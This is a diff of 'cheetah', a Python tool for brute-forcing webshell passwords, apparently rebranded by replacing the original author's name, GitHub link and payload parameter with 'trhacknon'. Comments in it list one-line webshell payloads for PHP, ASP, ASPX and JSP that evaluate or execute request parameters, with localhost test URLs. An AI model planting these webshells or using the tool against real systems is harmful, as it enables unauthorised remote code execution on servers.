@@ -13,14 +13,14 @@ password violent crack tools.
 """
 
 # payload format
-# php:  =>  <?php @eval($_GET['sunnyelf']);?> or <?php @eval($_POST['sunnyelf']);?>
-# http://localhost/shell_get.php?pwd=$s=pwd;print($s);&sunnyelf=$s=sunnyelf;print($s);
-# asp:  =>  <%eval request("sunnyelf")%>
-# http://localhost/shell.asp?pwd=response.write("pwd")&sunnyelf=response.write("sunnyelf")
-# aspx:  =>  <%@ Page Language="Jscript"%><%eval(Request.Item["sunnyelf"]);%>
-# http://localhost/shell.aspx?pwd=Response.Write("pwd");&sunnyelf=Response.Write("sunnyelf")
-# jsp:  =>  <%Runtime.getRuntime().exec(request.getParameter("sunnyelf"));%>
-# http://localhost/shell.jsp?pwd=System.out.println("pwd");&sunnyelf=System.out.println("sunnyelf");
+# php:  =>  <?php @eval($_GET['trhacknon']);?> or <?php @eval($_POST['trhacknon']);?>
+# http://localhost/shell_get.php?pwd=$s=pwd;print($s);&trhacknon=$s=trhacknon;print($s);
+# asp:  =>  <%eval request("trhacknon")%>
+# http://localhost/shell.asp?pwd=response.write("pwd")&trhacknon=response.write("trhacknon")
+# aspx:  =>  <%@ Page Language="Jscript"%><%eval(Request.Item["trhacknon"]);%>
+# http://localhost/shell.aspx?pwd=Response.Write("pwd");&trhacknon=Response.Write("trhacknon")
+# jsp:  =>  <%Runtime.getRuntime().exec(request.getParameter("trhacknon"));%>
+# http://localhost/shell.jsp?pwd=System.out.println("pwd");&trhacknon=System.out.println("trhacknon");
 
 import os
 import re
@@ -35,8 +35,8 @@ import argparse
 __program__ = 'cheetah'
 __version__ = '1.0.0'
 __license__ = 'GNU GPLv3'
-__author__ = 'sunnyelf[@hackfun.org]'
-__github__ = 'https://github.com/sunnyelf/cheetah'
+__author__ = 'trhacknon[@hackfun.org]'
+__github__ = 'https://github.com/trhacknon/cheetah'
 
 red = '\033[1;31m'
 green = '\033[1;32m'
@@ -91,7 +91,7 @@ __________  /_ _____ _____ __  /_______ ____  /_
 _  ___/__  __ \_  _ \_  _ \_  __/_  __ \ __  __ \
 / /__  _  / / //  __//  __// /_  / /_/ / _  / / /
 \___/  / / /_/ \___/ \___/ \__/  \____/  / / /_/
-      /_/                               /_/
+      /_/   by Trhacknon                /_/
 
 a very fast brute force webshell password tool.
     """
